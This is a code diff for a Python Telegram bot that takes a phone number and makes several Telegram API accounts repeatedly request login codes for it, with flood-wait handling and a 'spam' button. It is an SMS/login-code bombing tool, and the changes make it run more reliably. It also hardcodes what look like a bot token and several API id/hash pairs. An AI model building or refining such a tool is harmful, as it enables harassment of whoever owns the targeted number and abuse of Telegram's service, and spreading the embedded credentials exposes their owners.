@@ -1,11 +1,12 @@
 import re
+import time
+import requests
+import asyncio
 import telebot
 from telebot import types
 from telethon import TelegramClient, errors
-import asyncio
-import requests
 
-TOKEN = "8849356420:AAEjpTNzO7-gyehMmtqFd-jH3Mpd9a_Zwh0"
+TOKEN = "8978420835:AAHBaPWP0IGX4YHw1qawpE7nCoRXaK4Kxc4"
 ACCOUNTS = [
     {"api_id": 33788912, "api_hash": "175c63ac822b43d48b32776ee6b82761"},
     {"api_id": 33590106, "api_hash": "b40ac10586c1d243b6180c7f9a4feff2"},
@@ -15,11 +16,15 @@ ACCOUNTS = [
     {"api_id": 38299331, "api_hash": "fb5e560c3bda2db7541770b2294ee137"}
 ]
 
-requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook")
+resp = requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook")
+if resp.status_code != 200:
+    print("Failed to delete webhook", resp.text)
 
 bot = telebot.TeleBot(TOKEN, threaded=False)
 user_states = {}
 clients = []
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
 
 def init_clients():
     async def _init():
@@ -27,7 +32,7 @@ def init_clients():
             client = TelegramClient(None, acc["api_id"], acc["api_hash"])
             await client.connect()
             clients.append(client)
-    asyncio.run(_init())
+    loop.run_until_complete(_init())
 
 init_clients()
 
@@ -41,23 +46,21 @@ def send_codes_sync(chat_id, msg_id, phone):
     async def send_codes():
         log_msg = bot.send_message(chat_id, "Отправка начата...")
         max_flood = 0
-        status_lines = []
+        results = []
 
         async def send_one_client(client, idx):
             nonlocal max_flood
             sent = 0
             for attempt in range(6):
-                while True:
-                    try:
-                        await client.send_code_request(phone)
-                        sent += 1
-                        break
-                    except errors.FloodWaitError as e:
-                        if e.seconds > max_flood:
-                            max_flood = e.seconds
-                        await asyncio.sleep(e.seconds)
-                    except Exception:
-                        break
+                try:
+                    await client.send_code_request(phone)
+                    sent += 1
+                except errors.FloodWaitError as e:
+                    if e.seconds > max_flood:
+                        max_flood = e.seconds
+                    await asyncio.sleep(e.seconds)
+                except Exception:
+                    break
             return f"Акк{idx}: {sent}/6"
 
         tasks = [send_one_client(client, i+1) for i, client in enumerate(clients)]
@@ -68,7 +71,7 @@ def send_codes_sync(chat_id, msg_id, phone):
             remaining = max_flood
             while remaining > 0:
                 bot.edit_message_text(f"floodwait - {remaining}sekund", chat_id, msg_id)
-                asyncio.sleep(1)
+                time.sleep(1)
                 remaining -= 1
         kb = types.InlineKeyboardMarkup()
         kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
@@ -76,7 +79,7 @@ def send_codes_sync(chat_id, msg_id, phone):
         if chat_id in user_states:
             user_states[chat_id]["timer_task"] = None
 
-    asyncio.run(send_codes())
+    loop.run_until_complete(send_codes())
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -109,4 +112,7 @@ def handle_phone(message):
     send_codes_sync(chat_id, state["message_id"], phone)
 
 if __name__ == "__main__":
-    bot.polling(none_stop=True, interval=0)
+    try:
+        bot.polling(none_stop=True, interval=1)
+    except Exception as e:
+        print("Polling error:", e)
